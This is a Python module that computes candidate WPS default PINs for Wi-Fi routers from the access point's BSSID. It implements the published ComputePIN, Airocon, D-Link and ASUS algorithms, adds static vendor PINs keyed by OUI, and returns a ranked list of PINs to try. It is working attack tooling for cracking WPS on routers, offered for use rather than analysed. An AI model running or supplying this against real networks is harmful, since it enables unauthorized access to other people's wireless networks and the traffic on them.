#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""WPS default-PIN generation from published algorithms.

PINs are computed at runtime from published WPS default-PIN algorithms, so no
PIN table is bundled. The 8th digit is the Wi-Fi Simple Config checksum.

A router's OUI identifies its brand (an IEEE assignment) but never its chipset.
So candidates split into:
  * Broad: tried on every AP — chipset-family algorithms (ComputePIN, Airocon).
  * Brand-keyed: tried only on a matching OUI — D-Link, ASUS, and vendor statics.

Sources: bertof/WPS-pin-generator, devttys0 write-ups, 3WiFi (3wifi.stascorp.com/wpspin).
"""

from __future__ import annotations
from typing import Callable, Dict, List, Tuple


Generator = Callable[[bytes], List[str]]


# ---------------------------------------------------------------------------
# Checksum
# ---------------------------------------------------------------------------

def _pin_checksum(pin7: int) -> int:
    """Wi-Fi Simple Config 8th-digit checksum over a 7-digit payload."""
    acc = 0
    while pin7:
        acc += 3 * (pin7 % 10)
        pin7 //= 10
        acc += pin7 % 10
        pin7 //= 10
    return (10 - (acc % 10)) % 10


def _finalize(raw: int) -> str:
    """A 7-digit payload int → full 8-digit PIN with WSC checksum."""
    seven = raw % 10_000_000
    return '%07d%d' % (seven, _pin_checksum(seven))


def _mac(bssid: bytes) -> int:
    return int.from_bytes(bssid, 'big')


# ---------------------------------------------------------------------------
# Broad algorithms (tried on every AP)
# ---------------------------------------------------------------------------

def pin24(bssid: bytes) -> List[str]:
    """Broadcom / Atheros / Ralink 'ComputePIN' — the single most-effective algorithm."""
    return [_finalize(_mac(bssid) & 0xFFFFFF)]


def pin_airocon(bssid: bytes) -> List[str]:
    """Realtek / Airocon algorithm."""
    b = bssid
    raw = (((b[0] + b[1]) % 10)
           + ((b[5] + b[0]) % 10) * 10
           + ((b[4] + b[5]) % 10) * 100
           + ((b[3] + b[4]) % 10) * 1000
           + ((b[2] + b[3]) % 10) * 10000
           + ((b[1] + b[2]) % 10) * 100000
           + ((b[0] + b[1]) % 10) * 1000000)
    return [_finalize(raw)]


# ---------------------------------------------------------------------------
# Brand-keyed algorithms
# ---------------------------------------------------------------------------

def _dlink_raw(nic: int) -> int:
    pin = nic ^ 0x55AA55
    pin ^= (((pin & 0x0F) << 4)
            + ((pin & 0x0F) << 8)
            + ((pin & 0x0F) << 12)
            + ((pin & 0x0F) << 16)
            + ((pin & 0x0F) << 20))
    pin %= 10_000_000
    if pin < 1_000_000:
        pin += (pin % 9) * 1_000_000 + 1_000_000
    return pin


def pin_dlink(bssid: bytes) -> List[str]:
    """D-Link (Heffner/devttys0 2014)."""
    nic = _mac(bssid) & 0xFFFFFF
    return [_finalize(_dlink_raw(nic))]


def pin_dlink1(bssid: bytes) -> List[str]:
    """D-Link variant — NIC+1."""
    nic = (_mac(bssid) & 0xFFFFFF) + 1
    return [_finalize(_dlink_raw(nic))]


def pin_asus(bssid: bytes) -> List[str]:
    """ASUS — uses all 6 octets of the BSSID, two candidates."""
    b = bssid
    results = []
    for i in range(2):
        mac_mod = bytearray(b)
        mac_mod[5] = (mac_mod[5] + i) & 0xFF
        raw = ((mac_mod[0] + mac_mod[1]) % 10
               + ((mac_mod[5] + mac_mod[0]) % 10) * 10
               + ((mac_mod[4] + mac_mod[5]) % 10) * 100
               + ((mac_mod[3] + mac_mod[4]) % 10) * 1000
               + ((mac_mod[2] + mac_mod[3]) % 10) * 10000
               + ((mac_mod[1] + mac_mod[2]) % 10) * 100000
               + ((mac_mod[0] + mac_mod[1]) % 10) * 1000000)
        results.append(_finalize(raw))
    return results


# ---------------------------------------------------------------------------
# OUI registry — which OUI prefixes trigger which brand-keyed generators
# ---------------------------------------------------------------------------

# Each entry: (oui_prefix_bytes, generator_or_static_pin)
# OUI prefix is the first N bytes of the BSSID (N=3 usually).
_DLINK_OUIS = [
    bytes.fromhex(o) for o in [
        '00179A', '00265A', '1CAFF7', '340804', '6045CB', '8C68C8',
        '94A7B7', 'B8A386', 'C0A0BB', 'CCB255', 'F07D68', 'F46D04',
    ]
]
_ASUS_OUIS = [
    bytes.fromhex(o) for o in [
        '00266C', '04D4C4', '08606E', '086266', '10BF48', '10C37B',
        '14DDA9', '1C872C', '2C56DC', '305A3A', '382C4A', '3C1E04',
        '40167E', '50465D', '54A050', '6045CB', '60A44C', '704D7B',
        '74D02B', '788CB5', '7C2664', '803F5D', '84A9C4', '88D7F6',
        '9C5C8E', 'A8F7E0', 'AC220B', 'AC9E17', 'B06EBF', 'B4E929',
        'BC3400', 'C86000', 'D017C2', 'D850E6', 'E03F49', 'E4BEED',
    ]
]

# Static per-vendor defaults tried on matching OUIs
_VENDOR_STATICS: Dict[bytes, List[str]] = {
    bytes.fromhex('00149A'): ['12345670'],          # Thomson
    bytes.fromhex('00265A'): ['12345670'],          # Edimax
    bytes.fromhex('801F02'): ['12345670'],          # Upvel
    bytes.fromhex('1CAFF7'): ['76229909', '62327145'],  # D-Link DSL-2740R
}


def _oui_match(bssid: bytes, oui_list: List[bytes]) -> bool:
    prefix = bssid[:3]
    return any(prefix == o[:3] for o in oui_list)


# ---------------------------------------------------------------------------
# Public: pins_for(bssid_bytes)
# ---------------------------------------------------------------------------

def pins_for(bssid: bytes) -> List[str]:
    """Ranked, de-duped candidate WPS PINs for a BSSID (as 6 raw bytes).

    Order: broad algorithms first (highest hit rate), then brand-keyed on OUI match.
    De-duped: a candidate that two algorithms agree on is still tried once.
    """
    seen: set[str] = set()
    result: List[str] = []

    def add(pins: List[str]) -> None:
        for p in pins:
            if p not in seen:
                seen.add(p)
                result.append(p)

    # Broad — always
    add(pin24(bssid))
    add(pin_airocon(bssid))

    # Brand-keyed — OUI-gated
    prefix = bssid[:3]
    if _oui_match(bssid, _DLINK_OUIS):
        add(pin_dlink(bssid))
        add(pin_dlink1(bssid))
    if _oui_match(bssid, _ASUS_OUIS):
        add(pin_asus(bssid))

    # Vendor statics
    for oui_bytes, statics in _VENDOR_STATICS.items():
        if prefix == oui_bytes:
            add(statics)

    return result
